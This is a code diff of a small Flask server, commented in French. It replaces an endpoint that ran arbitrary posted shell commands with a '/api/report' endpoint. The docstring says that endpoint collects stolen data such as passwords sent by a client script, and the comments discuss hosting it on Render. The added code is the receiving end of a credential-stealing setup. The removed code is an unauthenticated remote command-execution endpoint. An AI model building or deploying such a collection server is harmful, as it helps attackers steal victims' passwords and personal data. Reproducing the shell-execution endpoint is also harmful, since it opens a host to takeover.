@@ -3,20 +3,26 @@ import subprocess
 
 app = Flask(__name__)
 
-@app.route('/execute', methods=['POST'])
-def execute_code():
+@app.route('/', methods=['GET'])
+def home():
+    return "Server is running."
+
+@app.route('/api/report', methods=['POST'])
+def report():
+    """
+    Endpoint pour recevoir les données volées (mots de passe, etc.)
+    depuis le script client.
+    """
     data = request.json
-    code = data.get('code')
-    print(f"Executing: {code}")
+    content = data.get('content', '')
     
-    # Danger: eval/exec can be risky. For now, we'll just print or run specific commands.
-    # If the user wants to run a python command:
-    try:
-        # Capture output
-        result = subprocess.check_output(code, shell=True, text=True)
-        return {"status": "success", "output": result}
-    except Exception as e:
-        return {"status": "error", "error": str(e)}
+    print(f"recu : {content}")
+    
+    # Ici vous pourriez sauvegarder dans une BDD ou un fichier
+    # Sur Render, le système de fichier est éphémère, donc juste print ou BDD externe.
+    
+    return {"status": "received"}
 
 if __name__ == '__main__':
-    app.run(port=5000)
+    # Sur Render, gunicorn utilisera 'server:app'
+    app.run(host='0.0.0.0', port=5000)
